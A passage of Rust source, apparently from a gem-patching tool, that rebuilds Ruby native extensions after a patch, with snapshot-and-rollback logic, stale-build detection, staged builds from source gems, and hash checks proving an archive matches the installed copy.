const NOT_READ: &str = "the build exited cleanly without reading any of those files, so nothing \
                        of the patch is compiled into the extension: this install's build does \
                        not use them. A gem set up to build against the system's copy of a \
                        library it packs (`--use-system-libraries`) does this to a patch for the \
                        packed copy (what the install runs is then the operating system's \
                        library, and updating that package is what fixes it), and so does a gem \
                        whose build downloads the binary it runs";

/// What is said of a build that exited cleanly and left no compiled file.
const NOTHING_BUILT: &str = "the build exited cleanly and left no compiled file to put where \
                             Ruby loads it: what this gem runs is not a product of its extension \
                             build (a gem whose build downloads the binary it runs, or leaves one \
                             outside the extension dir, does this)";

/// Why [`rebuild`] left the copy's previous build in place.
#[derive(Debug)]
enum NotRebuilt {
    /// The build failed, or what it made could not be kept: the diagnostic.
    Failed(String),
    /// The build exited cleanly and showed that this install compiles
    /// nothing of the record: it read none of the record's build inputs
    /// ([`unread_inputs`]), or it left no compiled file at all. The reason,
    /// as a clause.
    NotOfPatch(String),
}

impl NotRebuilt {
    fn into_detail(self) -> String {
        match self {
            NotRebuilt::Failed(detail) | NotRebuilt::NotOfPatch(detail) => detail,
        }
    }
}

/// Whether a build that has just exited left compiled code: an artifact in
/// the extension dir, or a changed file in the gem's own tree that Ruby
/// could load.
fn left_compiled_code(probe: &Probe, changes: &TreeChanges) -> bool {
    let dlext = probe.facts.as_ref().map(|facts| facts.dlext.as_str());
    !artifact_rels(&probe.extension_dir).is_empty()
        || changes
            .replaced
            .iter()
            .chain(&changes.created)
            .any(|rel| is_loadable(rel, &probe.require_paths, dlext))
}

/// Why a build that exited cleanly is not one of the sources on disk, when
/// that shows in the files it left: `None` when nothing does.
///
/// A build run over an installed tree finds the products of the install
/// there, and one that takes them for current compiles nothing (a Rakefile
/// whose library task does not depend on the C sources). `removed` are the
/// products taken out of its way beforehand, each of which it must have
/// made again. With none known, a gem that keeps a shared library in its
/// own tree must show compiled code from the build: an artifact in the
/// extension dir, or a changed file in the tree that Ruby could load. (A
/// gem with no library in its tree and none in its extension dir compiles
/// nothing on this platform, and there is nothing stale for Ruby to load.)
fn stale_build(
    copy: &GemCopy,
    probe: &Probe,
    removed: &[String],
    snapshot: &TreeSnapshot,
    changes: &TreeChanges,
) -> Option<String> {
    let missing: Vec<&str> = removed
        .iter()
        .filter(|rel| !is_real_file(&copy.gem_dir.join(rel)))
        .map(String::as_str)
        .collect();
    if !missing.is_empty() {
        return Some(format!(
            "the build exited cleanly but did not make {} again, which the gem's build from \
             its source gem leaves in the gem's own tree",
            missing.join(", ")
        ));
    }
    if !removed.is_empty() {
        return None;
    }
    let dlext = probe.facts.as_ref().map(|facts| facts.dlext.as_str());
    let keeps_library = snapshot
        .files
        .keys()
        .any(|rel| is_library_name(leaf_of(rel), dlext));
    (keeps_library && !left_compiled_code(probe, changes)).then(|| {
        "the build exited cleanly but compiled nothing: it left no artifact in the extension \
         dir and changed no file of the gem's own tree that Ruby loads, so the gem still runs \
         the library that was there (a build script that takes the library it finds for \
         current does this)"
            .to_string()
    })
}

/// Rebuild `copy`'s extension from the sources on disk with `probe.ruby`,
/// in its installed tree, as close to a fresh install's as `seen` (what
/// the build of its source gem showed, [`StageFailure::InTree`]) lets it
/// be made. The files of the tree that build is known to make are taken
/// out of the build's way, as a fresh install has none of them, so a build
/// that would take them for current makes them again. The files the gem
/// ships that the tree no longer holds are put back for it ([`give_back`]),
/// so a build script that uses one up can run again (#2106); those the
/// build leaves as they were are taken away after it, whether it finished
/// or not.
///
/// The gem's own tree is snapshotted first ([`TreeSnapshot`]). What a
/// finished build replaced or added there is backed up with the original
/// build and attested by the marker like the extension dir's artifacts.
/// On failure every build product, in the extension dir and in the gem's
/// tree, is put back as it was; `Err` says why ([`NotRebuilt`]). A build
/// that exits cleanly without building the sources fails too
/// ([`stale_build`]): that holds for a rollback's rebuild of the restored
/// sources as for a patch's. So does a build of a record (`files`) that
/// shows this install compiles nothing of it
/// ([`NotRebuilt::NotOfPatch`]): the previous build is what the copy keeps.
async fn rebuild(
    copy: &GemCopy,
    probe: &Probe,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
    env: &RubyEnv,
    back_up: bool,
    seen: &SeenInStage,
) -> Result<(), NotRebuilt> {
    // A backup this rebuild made is dropped again when the build does not
    // land: the install-time build is back in place, so the copy is as it
    // was before the run.
    let drop_new_backup = |copy: &GemCopy, made: bool| {
        if made {
            let _ = remove_dir_if_exists(&copy.gem_dir.join(BACKUP_DIR));
        }
    };
    // The record's files are the patch's to write and put back, not the
    // build's.
    let left: Vec<String> = files
        .keys()
        .map(|key| normalize_file_path(key).to_string())
        .collect();
    let (aside, made_backup, snapshot, removed, given) = {
        let (copy, probe) = (copy.clone(), probe.clone());
        let (stale, used_up) = (seen.created.clone(), seen.used_up.clone());
        crate::utils::fs::run_blocking(move || {
            let made = if back_up {
                back_up_original(&copy, &probe, &[])
                    .map_err(|e| format!("could not back up the original extension build: {e}"))?
            } else {
                false
            };
            let aside = match set_aside(&copy, &probe) {
                Ok(aside) => aside,
                Err(e) => {
                    drop_new_backup(&copy, made);
                    return Err(format!(
                        "could not move the current extension build aside: {e}"
                    ));
                }
            };
            // Under the parked build's lock, and only files the snapshot
            // holds are removed: each can be put back.
            let prepared = snapshot_tree(&copy, &probe.extension_dir, &left).and_then(|snapshot| {
                let mut removed = Vec::new();
                for rel in stale {
                    if snapshot.files.contains_key(&rel) {
                        std::fs::remove_file(copy.gem_dir.join(&rel))?;
                        removed.push(rel);
                    }
                }
                Ok((snapshot, removed))
            });
            // What is written here is in no snapshot: the undo of a failed
            // build removes it. Files that cannot be written (a full
            // disk) leave the tree as it is, which is what the build ran
            // over before there was anything to give it.
            let prepared = prepared.map(|(snapshot, removed)| {
                let given = give_back(&copy, &snapshot, &used_up, &left).unwrap_or_default();
                (snapshot, removed, given)
            });
            match prepared {
                Ok((snapshot, removed, given)) => Ok((aside, made, snapshot, removed, given)),
                Err(e) => {
                    // The parked build stays where it is when the tree
                    // cannot be put back: the next run tries again.
                    // (A snapshot that cannot be probed is not taken for
                    // none: files may be gone from the tree by now.)
                    let snapshot_dir = tree_snapshot_path(&probe.extension_dir);
                    let undone = match try_entry_type(&snapshot_dir) {
                        Ok(Some(kind)) if kind.is_dir() => restore_tree(&copy, &snapshot_dir),
                        Ok(_) => Ok(()),
                        Err(e) => Err(e),
                    };
                    let undone = undone.and_then(|()| put_back(&copy, &probe, aside));
                    if undone.is_ok() {
                        drop_new_backup(&copy, made);
                    }
                    Err(format!(
                        "could not keep a copy of the gem's files to build over: {e}"
                    ))
                }
            }
        })
        .await
        .map_err(NotRebuilt::Failed)?
    };
    // Nothing reads the tree between here and the check after the build
    // but the build. A rebuild without record files (a rollback's, of the
    // original sources) has no patch to look for.
    let watch = if files.is_empty() {
        None
    } else {
        let (gem_dir, scope) = (copy.gem_dir.clone(), scope.clone());
        Some(crate::utils::fs::run_blocking(move || watch_inputs(&gem_dir, &scope)).await)
    };
    let from = if files.is_empty() {
        "the sources in the installed gem"
    } else {
        "the patched sources in the installed gem"
    };
    let built = run_build(probe, RubyRun::Build(probe), copy, env, from).await;
    let (copy, probe, scope, files) = (copy.clone(), probe.clone(), scope.clone(), files.clone());
    crate::utils::fs::run_blocking(move || {
        // A build whose record cannot be written is undone like a failed
        // one: an unrecorded build would never be attested, and the caller
        // puts the original sources back. So is one that exits cleanly
        // without an extension dir: the old one was moved aside for it.
        let committed = match built {
            Ok(_) if !probe.extension_dir.is_dir() => Err(NotRebuilt::Failed(format!(
                "the build exited cleanly but left no extension in {}",
                probe.extension_dir.display()
            ))),
            Ok(_) => {
                // Before anything else reads the tree.
                let unread = watch
                    .as_ref()
                    .and_then(|watch| unread_inputs(&copy.gem_dir, watch, &snapshot.dir));
                // What the build left of the files it was given is no
                // change it made.
                take_away(&copy, &given);
                let changes = tree_changes(&copy, &snapshot);
                let stale = stale_build(&copy, &probe, &removed, &snapshot, &changes);
                match (stale, unread) {
                    // A build that took the products it found for current
                    // read nothing either, and a fresh build would: that
                    // is the failure to name.
                    (Some(why), _) => Err(NotRebuilt::Failed(why)),
                    (None, Some(_)) => Err(NotRebuilt::NotOfPatch(NOT_READ.to_string())),
                    // A record's build that leaves no compiled code has
                    // nothing for the record to be in (#2144). A rollback's
                    // (no record) leaves the gem as its install did.
                    (None, None)
                        if !files.is_empty()
                            && removed.is_empty()
                            && !left_compiled_code(&probe, &changes) =>
                    {
                        Err(NotRebuilt::NotOfPatch(NOTHING_BUILT.to_string()))
                    }
                    // The backup learns of the tree's changes before the
                    // marker says the build is done: a run that dies in
                    // between is undone from the snapshot.
                    (None, None) => back_up_tree_changes(&copy, &snapshot, &removed, &changes)
                        .and_then(|()| {
                            let in_tree = in_tree_artifacts(&copy, &probe, &removed, &changes);
                            commit_build(&copy, &probe, &scope, &files, &aside, &in_tree)
                        })
                        .map_err(|e| {
                            NotRebuilt::Failed(format!(
                                "the extension built, but its build record could not be \
                                 written: {e}"
                            ))
                        }),
                }
            }
            Err(diagnostic) => Err(NotRebuilt::Failed(diagnostic)),
        };
        let why = match committed {
            Ok(()) => {
                let _ = remove_dir_if_exists(&snapshot.dir);
                return Ok(());
            }
            Err(why) => why,
        };
        // The gem's own tree first, while the parked build still says a
        // rebuild is under way: if it cannot be put back, the parked build
        // stays, and the next run tries again from the snapshot.
        let undone = restore_tree(&copy, &snapshot.dir)
            .map(|()| {
                // The files went with the restore; the dirs made for them
                // are left to go.
                take_away(&copy, &given);
            })
            .and_then(|()| put_back(&copy, &probe, aside));
        match undone {
            Ok(()) => {
                drop_new_backup(&copy, made_backup);
                Err(why)
            }
            // A copy whose previous build is not back is a failure,
            // whatever the build showed.
            Err(e) => Err(NotRebuilt::Failed(format!(
                "{}\n(the previous build could not be put back: {e}; run `gem pristine {} \
                 --extensions` to rebuild it)",
                why.into_detail(),
                gem_name_of(&copy.full_name)
            ))),
        }
    })
    .await
}

/// `<home>/.socket-patch-build/<full_name>`: where a rebuild of `copy` from
/// its source gem is staged.
fn stage_root(copy: &GemCopy) -> PathBuf {
    copy.home.join(BUILD_STAGE_DIR).join(&copy.full_name)
}

/// The stage dirs of `copy`, `<home>/.socket-patch-build` and the
/// `<full_name>` dir inside it, when each is a real directory or not there
/// at all. The gem tree can come from the repository being scanned, and a
/// stage is created, emptied and deleted by path: a link (or a file)
/// planted at either name would steer those writes and deletes into
/// whatever it points at. An entry that cannot be probed is no better: only
/// "not found" says nothing is there ([`ensure_dir_or_absent`]). `Err` says
/// which entry is in the way, and how. Every use of the stage goes through
/// here.
fn stage_dirs(copy: &GemCopy) -> Result<(PathBuf, PathBuf), String> {
    let parent = copy.home.join(BUILD_STAGE_DIR);
    let root = stage_root(copy);
    for dir in [&parent, &root] {
        ensure_dir_or_absent(dir).map_err(|e| format!("its stage directory {e}"))?;
    }
    Ok((parent, root))
}

/// The file a staged rebuild rewrites before each of its steps, in the
/// stage dir: where a directory cannot be locked, its age is what tells a
/// stage a run is still building in from one a dead run left.
const STAGE_HEARTBEAT: &str = "alive";

/// How long after its last heartbeat a stage that cannot be locked is
/// taken for dead: no step of a staged rebuild outlives [`BUILD_TIMEOUT`].
const UNLOCKED_STAGE_AGE: Duration = Duration::from_secs(BUILD_TIMEOUT.as_secs() + 5 * 60);

/// The error of a stage that cannot be locked and is too young to be told
/// from a live one ([`recovery_refusal`] words it).
const UNLOCKED_STAGE_IN_USE: &str = "a staged rebuild may still be running";

/// Whether the stage at `root`, which no lock vouches for, was last used
/// longer ago than any live step lasts.
fn unlocked_stage_is_dead(root: &Path) -> bool {
    let modified = |path: &Path| std::fs::symlink_metadata(path).and_then(|m| m.modified());
    let newest = [modified(&root.join(STAGE_HEARTBEAT)), modified(root)]
        .into_iter()
        .flatten()
        .max();
    match newest.map(|at| at.elapsed()) {
        // A clock that ran backwards says nothing: not provably dead.
        Some(Ok(age)) => age > UNLOCKED_STAGE_AGE,
        _ => false,
    }
}

/// Drop the stage a rebuild of `copy` left behind when its process was
/// interrupted or killed. Nothing of the installed copy is in a stage, so
/// one that is left is only disk space. `Err` of kind `WouldBlock`: a run
/// that is still alive holds it ([`lock_build_dir`]); or, where a
/// directory cannot be locked, it is not old enough to be provably dead
/// ([`unlocked_stage_is_dead`]). A link planted where the stage goes, or
/// an entry there that cannot be probed, is left alone, with whatever it
/// points at ([`stage_dirs`]).
fn sweep_stale_stage(copy: &GemCopy) -> std::io::Result<()> {
    sweep_stale_stage_with(copy, lock_build_dir)
}

/// [`sweep_stale_stage`], with the way a stage dir is locked.
fn sweep_stale_stage_with(
    copy: &GemCopy,
    lock: impl Fn(&Path) -> std::io::Result<Option<std::fs::File>>,
) -> std::io::Result<()> {
    let Ok((parent, root)) = stage_dirs(copy) else {
        return Ok(());
    };
    if is_real_dir(&root) {
        match lock(&root) {
            Ok(Some(_lock)) => crate::patch::copy_tree::force_remove_dir_all(&root)?,
            Ok(None) if unlocked_stage_is_dead(&root) => {
                crate::patch::copy_tree::force_remove_dir_all(&root)?
            }
            Ok(None) => {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::WouldBlock,
                    UNLOCKED_STAGE_IN_USE,
                ))
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(e),
        }
    }
    // Gone with its last stage; a dir that still holds one stays.
    let _ = std::fs::remove_dir(parent);
    Ok(())
}

/// The stage of one rebuild from a source gem, held (an advisory lock on
/// its dir) for as long as the value lives.
struct Stage {
    root: PathBuf,
    /// The stage gem home, `<root>/home`: RubyGems unpacks, builds and
    /// installs the build's missing dependencies here, and nowhere else.
    home: PathBuf,
    _lock: Option<std::fs::File>,
}

impl Stage {
    /// Say the stage is in use, before a step that may take a while
    /// ([`STAGE_HEARTBEAT`]). Best effort.
    fn beat(&self) {
        let _ = std::fs::write(self.root.join(STAGE_HEARTBEAT), b"");
    }
}

/// Open an empty stage for `copy` inside its gem home. `Err` says why the
/// build cannot be staged there: [`StageFailure::Busy`] when a run that is
/// still alive holds it, else [`StageFailure::NoStage`].
fn open_stage(copy: &GemCopy) -> Result<Stage, StageFailure> {
    // The stage is emptied and written under the gem home. A link planted
    // where it goes would move both somewhere else.
    let (parent, root) = stage_dirs(copy).map_err(StageFailure::NoStage)?;
    let failed = |e: std::io::Error| {
        if e.kind() == std::io::ErrorKind::WouldBlock {
            StageFailure::Busy(recovery_refusal(copy, &e))
        } else {
            StageFailure::NoStage(format!(
                "a build could not be staged in {}: {e}",
                parent.display()
            ))
        }
    };
    sweep_stale_stage(copy).map_err(failed)?;
    let home = root.join("home");
    std::fs::create_dir_all(&home).map_err(failed)?;
    let lock = lock_build_dir(&root).map_err(failed)?;
    let stage = Stage {
        root,
        home,
        _lock: lock,
    };
    stage.beat();
    Ok(stage)
}

/// Remove `stage`, and the stage dir of the gem home when that left it
/// empty. Best effort: a stage that stays is swept by the next run.
async fn close_stage(stage: Stage, copy: &GemCopy) {
    let copy = copy.clone();
    crate::utils::fs::run_blocking(move || {
        // By the same guarded names it was opened under.
        if let Ok((parent, root)) = stage_dirs(&copy) {
            if root == stage.root {
                let _ = crate::patch::copy_tree::force_remove_dir_all(&root);
            }
            let _ = std::fs::remove_dir(parent);
        }
    })
    .await;
}

/// The fields after the key of every `<key>\t…` line of a Ruby run's
/// output.
fn tagged_lines<'s>(stdout: &'s str, key: &str) -> Vec<Vec<&'s str>> {
    stdout
        .lines()
        .filter_map(|line| {
            let mut fields = line.split('\t');
            (fields.next()? == key).then(|| fields.collect())
        })
        .collect()
}

/// A source gem unpacked into a stage home.
#[derive(Debug, Clone, PartialEq, Eq)]
struct StagedGem {
    /// `<stage home>/gems/<full name>`: the gem's files, as the archive
    /// packs them.
    gem_dir: PathBuf,
    /// `<stage home>/specifications/<full name>.gemspec`.
    spec_path: PathBuf,
}

/// A staged gem whose extensions RubyGems built in the stage home.
#[derive(Debug, Clone, PartialEq, Eq)]
struct StagedBuild {
    gem: StagedGem,
    /// The extension dir the build filled:
    /// `<stage home>/extensions/<platform>/<abi>/<full name>`.
    extension_dir: PathBuf,
    /// That dir relative to the stage home.
    label: String,
}

/// Why a copy's extension was not built from its source gem. Whatever the
/// reason, nothing of the installed copy was touched: a gem RubyGems built
/// can still be rebuilt in place, from its own tree.
#[derive(Debug)]
enum StageFailure {
    /// Another run is building this gem in its stage right now. The one
    /// failure after which nothing else is tried.
    Busy(String),
    /// There is no archive to build from.
    NoArchive(String),
    /// The stage could not be opened in the gem home.
    NoStage(String),
    /// RubyGems could not unpack the archive as this gem.
    Unpack(String),
    /// The archive is not the installed copy's own source
    /// ([`prove_own_source`]).
    NotOwnSource(String),
    /// The record does not apply to the pristine source gem.
    Mismatch(String),
    /// A gem its build scripts depend on is not installed and could not be
    /// staged beside it.
    Dependencies(String),
    /// RubyGems' builder failed: the build's diagnostic.
    Build(String),
    /// The build read none of the record's build inputs ([`unread_inputs`]):
    /// it is no build of the patch, and neither would one of the installed
    /// tree be.
    NotRead,
    /// The build leaves what Ruby loads in the gem's own tree
    /// ([`in_tree_products`]), where a build staged elsewhere cannot stand
    /// in for it.
    InTree {
        products: Vec<String>,
        /// What the staged build showed that a build of the installed
        /// tree goes by.
        seen: SeenInStage,
    },
}

/// A file the source gem ships that the installed copy does not hold.
#[derive(Debug, Clone, PartialEq, Eq)]
struct ShippedFile {
    /// Its path in the gem dir, `/`-separated.
    rel: String,
    bytes: Vec<u8>,
    permissions: std::fs::Permissions,
    /// When the stage's copy was written: before the record's files were,
    /// in the stage and in the installed copy.
    modified: Option<std::time::SystemTime>,
}

/// What building a gem's source gem in a stage showed of its build, for a
/// build of the installed tree ([`rebuild`]) to go by. The default (no
/// staged build to learn from) changes nothing of that build.
#[derive(Debug, Default)]
struct SeenInStage {
    /// The files Ruby loads that the build made in the gem's own tree and
    /// the source gem does not ship ([`in_tree_products`]): a fresh
    /// install builds without them.
    created: Vec<String>,
    /// The files the source gem ships that the installed copy no longer
    /// holds ([`used_up_files`]): a fresh install builds with them.
    used_up: Vec<ShippedFile>,
}

/// The most bytes of [`used_up_files`] a run keeps while the staged build
/// runs. A gem that ships more than this and installs without it is built
/// in place from the tree as it is.
const USED_UP_LIMIT: u64 = 64 * 1024 * 1024;

/// The files of the pristine source gem unpacked at `staged` that the
/// copy at `installed` does not hold, with their content.
///
/// RubyGems installs every file of a gem, so one that is gone was taken
/// away after the install, as a rule by the gem's own build: a script that
/// renames a file it ships (argon2's `extconf.rb` makes `Makefile.real`
/// its `Makefile`), or one that deletes the sources it has compiled. That
/// build cannot run a second time over what it left, and the build of the
/// stage uses the staged files up the same way, so they are read before
/// it. All of them or none: a file that cannot be read, or more than
/// [`USED_UP_LIMIT`] in all, keeps nothing.
///
/// Each keeps the time the stage's copy was written, which is before the
/// record's files are written anywhere. A file given back with the time
/// of its writing would be newer than the patched sources, and a build
/// that makes one from the other (a parser the gem ships generated) would
/// take the shipped one for current.
fn used_up_files(installed: &Path, staged: &Path) -> Vec<ShippedFile> {
    let mut files = Vec::new();
    let mut total = 0u64;
    for rel in tree_files(staged) {
        if !is_safe_relative_subpath(&rel) || is_own_entry(&rel) {
            continue;
        }
        // Only a file that is not there is one the copy does not hold.
        if !matches!(try_entry_type(&installed.join(&rel)), Ok(None)) {
            continue;
        }
        let path = staged.join(&rel);
        // Its size before its bytes: one that is over the limit is not
        // read to find that out.
        let Ok(meta) = std::fs::symlink_metadata(&path) else {
            return Vec::new();
        };
        total = total.saturating_add(meta.len());
        if total > USED_UP_LIMIT {
            return Vec::new();
        }
        let Ok(bytes) = read_regular_to_bytes_sync(&path) else {
            return Vec::new();
        };
        files.push(ShippedFile {
            rel,
            bytes,
            permissions: meta.permissions(),
            modified: meta.modified().ok(),
        });
    }
    files
}

/// The files [`give_back`] wrote, and the dirs it made for them.
#[derive(Debug, Default)]
struct GivenBack {
    /// Gem-dir path → git-sha256 of what was written.
    files: Vec<(String, String)>,
    /// Deepest first.
    dirs: Vec<PathBuf>,
}

/// Write the files a fresh install of the gem would hold and `copy` does
/// not (`used_up`) into its tree, for an in-place build to find: after
/// `snapshot` was taken, so the undo of a failed build removes them
/// ([`restore_tree`]). A path the tree holds by now, one of the record's
/// (`left`), and one under a link in the gem dir (it would be written
/// through the link) are left alone. On `Err` nothing of it is left.
fn give_back(
    copy: &GemCopy,
    snapshot: &TreeSnapshot,
    used_up: &[ShippedFile],
    left: &[String],
) -> std::io::Result<GivenBack> {
    let mut given = GivenBack::default();
    let written = write_used_up(copy, snapshot, used_up, left, &mut given);
    // Deepest first, each once.
    given
        .dirs
        .sort_by_key(|dir| std::cmp::Reverse(dir.components().count()));
    given.dirs.dedup();
    match written {
        Ok(()) => Ok(given),
        Err(e) => {
            // Nothing has run since: every file listed is this call's,
            // whole or not.
            for (rel, _) in &given.files {
                let _ = std::fs::remove_file(copy.gem_dir.join(rel));
            }
            take_away(copy, &given);
            Err(e)
        }
    }
}

/// [`give_back`]'s writes, each listed in `given` before it is made.
fn write_used_up(
    copy: &GemCopy,
    snapshot: &TreeSnapshot,
    used_up: &[ShippedFile],
    left: &[String],
    given: &mut GivenBack,
) -> std::io::Result<()> {
    for file in used_up {
        let rel = &file.rel;
        if !is_safe_relative_subpath(rel)
            || is_own_entry(rel)
            || left.contains(rel)
            || snapshot.files.contains_key(rel)
        {
            continue;
        }
        let path = copy.gem_dir.join(rel);
        if crate::utils::containment::try_linked_level(&copy.gem_dir, &path)?.is_some()
            || try_entry_type(&path)?.is_some()
        {
            continue;
        }
        // The dirs that are made for it, to take away again with it.
        let mut made = Vec::new();
        let mut dir = path.parent();
        while let Some(parent) = dir.filter(|parent| *parent != copy.gem_dir) {
            if try_entry_type(parent)?.is_some() {
                break;
            }
            made.push(parent.to_path_buf());
            dir = parent.parent();
        }
        given.dirs.extend(made);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        given
            .files
            .push((rel.clone(), compute_git_sha256_from_bytes(&file.bytes)));
        std::fs::write(&path, &file.bytes)?;
        if let Some(modified) = file.modified {
            // Before the permissions, which may not let it be opened.
            std::fs::OpenOptions::new()
                .write(true)
                .open(&path)?
                .set_modified(modified)?;
        }
        std::fs::set_permissions(&path, file.permissions.clone())?;
    }
    Ok(())
}

/// Take away what [`give_back`] wrote and the build left as it was: a
/// file of the gem that the installed copy did not hold before the build
/// is not left in it after. A file the build changed is the build's, and
/// stays. So does a dir that still holds something.
fn take_away(copy: &GemCopy, given: &GivenBack) {
    for (rel, hash) in &given.files {
        let path = copy.gem_dir.join(rel);
        if is_real_file(&path) && compute_file_git_sha256_sync(&path).ok().as_ref() == Some(hash) {
            let _ = std::fs::remove_file(&path);
        }
    }
    for dir in &given.dirs {
        // Fails on a dir that is not empty, which is the point.
        let _ = std::fs::remove_dir(dir);
    }
}

impl StageFailure {
    /// The failure as a clause of a message.
    fn describe(&self) -> String {
        match self {
            StageFailure::Busy(why)
            | StageFailure::NoArchive(why)
            | StageFailure::NoStage(why)
            | StageFailure::Dependencies(why) => why.clone(),
            StageFailure::Unpack(why) => format!("the archive could not be unpacked ({why})"),
            StageFailure::NotOwnSource(why) => {
                format!("the archive is not the installed gem's own source: {why}")
            }
            StageFailure::Mismatch(why) => {
                format!("the patch does not apply to the source gem: {why}")
            }
            StageFailure::Build(diagnostic) => {
                format!("the source gem did not build:\n{diagnostic}")
            }
            StageFailure::NotRead => NOT_READ.to_string(),
            StageFailure::InTree { products, .. } => format!(
                "the source gem's build leaves {} in the gem's own tree, which is where it is \
                 loaded from, and a build staged elsewhere cannot take its place",
                products.join(", ")
            ),
        }
    }
}

/// Unpack `archive` (the source gem `source`) into `stage` with the Ruby
/// that owns the copy. The archive must be that gem and declare
/// extensions; nothing of it is run. `Err` says why it cannot be the
/// source of a rebuild.
async fn unpack_in_stage(
    copy: &GemCopy,
    probe: &Probe,
    source: &GemId,
    archive: Vec<u8>,
    stage: &Stage,
    env: &RubyEnv,
) -> Result<StagedGem, String> {
    let full_name = source.full_name();
    let path = stage.root.join(format!("{full_name}.gem"));
    {
        let path = path.clone();
        crate::utils::fs::run_blocking(move || std::fs::write(path, archive))
            .await
            .map_err(|e| format!("it could not be staged: {e}"))?;
    }
    let run = RubyRun::Unpack {
        archive: &path,
        stage_home: &stage.home,
        full_name: &full_name,
    };
    stage.beat();
    let stdout = run_ruby(&probe.ruby, run, copy, env, UNPACK_TIMEOUT).await?;
    let unpacked = tagged_lines(&stdout, "sp_unpacked")
        .into_iter()
        .any(|fields| fields.first() == Some(&full_name.as_str()));
    let staged = StagedGem {
        gem_dir: stage.home.join("gems").join(&full_name),
        spec_path: stage
            .home
            .join("specifications")
            .join(format!("{full_name}.gemspec")),
    };
    if !unpacked || !is_real_dir(&staged.gem_dir) || !staged.spec_path.is_file() {
        return Err(format!(
            "{}: unreadable unpack output",
            probe.ruby.display()
        ));
    }
    Ok(staged)
}

/// Prove that the gem unpacked at `staged` is the installed copy's own
/// source, before anything of it is built: every file the two trees share
/// must be byte-identical. `Ok` is the number of files that agreed.
///
/// An archive is found by the gem's name and version (the home's `cache/`,
/// the registry), and a name does not say whose gem it is: a private gem
/// can share the name of a public one, and the lock that would tell them
/// apart is not always the one at the project root. The files do say. A
/// copy RubyGems built shares everything its build did not delete or
/// generate; a precompiled copy shares its Ruby files and the sources of
/// the binary it ships. A file of the record (`files`) may hold what the
/// record writes instead, and one that holds neither content is left to
/// the run's mismatch policy, as on the installed copy. Any other
/// difference, or no shared file at all, means this is not that gem.
fn prove_own_source(
    installed: &Path,
    staged: &Path,
    files: &HashMap<String, PatchFileInfo>,
) -> Result<usize, String> {
    let record: HashMap<&str, &PatchFileInfo> = files
        .iter()
        .map(|(key, info)| (normalize_file_path(key), info))
        .collect();
    let mut agreed = 0;
    for rel in tree_files(staged) {
        let theirs = installed.join(&rel);
        // Only a file that is not there is one the copy does not hold. One
        // that cannot be probed is not compared, so it proves nothing.
        match try_entry_type(&theirs) {
            Ok(None) => continue,
            Ok(Some(kind)) if !kind.is_file() => {
                return Err(format!("{rel} is not a file in the installed gem"))
            }
            Ok(Some(_)) => {}
            Err(e) => return Err(format!("{rel}: in the installed gem, {e}")),
        }
        let (Ok(ours), Ok(theirs)) = (
            compute_file_git_sha256_sync(&staged.join(&rel)),
            compute_file_git_sha256_sync(&theirs),
        ) else {
            return Err(format!("{rel} could not be read to compare"));
        };
        match record.get(rel.as_str()) {
            _ if ours == theirs => agreed += 1,
            Some(info) if info.after_hash == theirs => agreed += 1,
            // The installed file is the one the record replaces, and the
            // archive's is another: not the gem the copy was installed
            // from. Content that is neither is the mismatch policy's.
            Some(info) if info.before_hash != theirs => {}
            _ => return Err(format!("{rel} differs from the installed gem's")),
        }
    }
    if agreed == 0 {
        return Err("it shares no file with the installed gem".to_string());
    }
    Ok(agreed)
}

/// Lay the record's files over the staged source gem, with the engine that
/// patches an installed copy. Every `beforeHash` is checked against the
/// pristine gem (`Strict`, whatever the run's policy for the installed
/// copy): a mismatch means the archive is not the gem the patch was written
/// for. A file the record changes and the source gem does not pack is left
/// out when it is no build input (a platform gem's own file). `Err` is the
/// engine's reason.
async fn patch_staged_gem(
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &str,
    staged: &StagedGem,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
    sources: &PatchSources<'_>,
) -> Result<(), String> {
    let mut staged_files = files.clone();
    for (key, info) in files {
        if info.before_hash.is_empty() || scope.inputs.contains(key) {
            continue;
        }
        let path = normalize_file_path(key);
        let missing = is_safe_relative_subpath(path)
            && matches!(
                tokio::fs::symlink_metadata(staged.gem_dir.join(path)).await,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound
            );
        if missing {
            staged_files.remove(key);
        }
    }
    let applied = apply_package_patch(
        read_scope,
        package_key,
        &staged.gem_dir,
        &staged_files,
        sources,
        false,
        MismatchPolicy::Strict,
    )
    .await;
    if applied.success {
        Ok(())
    } else {
        Err(applied
            .error
            .unwrap_or_else(|| "the patch did not apply".to_string()))
    }
}

/// The patched content the stage is built from: the caller's in-memory
/// blobs for the record, and the bytes of every record file the installed
/// copy already holds patched. A copy whose sources an earlier run patched
/// is rebuilt from them even when their blobs are no longer on disk.
async fn stage_blobs(
    pkg_path: &Path,
    files: &HashMap<String, PatchFileInfo>,
    sources: &PatchSources<'_>,
) -> HashMap<String, Vec<u8>> {
    let mut out = HashMap::new();
    for (key, info) in files {
        if let Some(bytes) = sources.mem_blobs.and_then(|m| m.get(&info.after_hash)) {
            out.insert(info.after_hash.clone(), bytes.clone());
            continue;
        }
        let path = normalize_file_path(key);
        if !is_safe_relative_subpath(path) {
            continue;
        }
        if let Ok(bytes) = crate::utils::fs::read_regular_to_bytes(&pkg_path.join(path)).await {
            if compute_git_sha256_from_bytes(&bytes) == info.after_hash {
                out.insert(info.after_hash.clone(), bytes);
            }
        }
    }
    out
}

/// Put the gems the staged gem's build depends on, and no gem on the
/// build's `GEM_PATH` provides, into the stage home: each is the newest
/// release its requirement allows, downloaded from the default registry
/// and verified against its index ([`GemSource::dependency`]), then
/// installed there by RubyGems. The user's gem home is never written.
/// `Err` names what is missing.
async fn stage_dependencies(
    copy: &GemCopy,
    probe: &Probe,
    staged: &StagedGem,
    stage: &Stage,
    gems: &GemSource,
    env: &RubyEnv,
) -> Result<(), String> {
    let versions = probe
        .facts
        .as_ref()
        .map(RubyFacts::versions)
        .unwrap_or_default();
    let mut staged_names: Vec<String> = Vec::new();
    loop {
        let run = RubyRun::MissingDeps {
            spec: &staged.spec_path,
            stage_home: &stage.home,
        };
        stage.beat();
        let stdout = run_ruby(&probe.ruby, run, copy, env, PROBE_TIMEOUT).await?;
        if !stdout
            .lines()
            .any(|line| line.trim_end() == "sp_deps_checked")
        {
            return Err(format!(
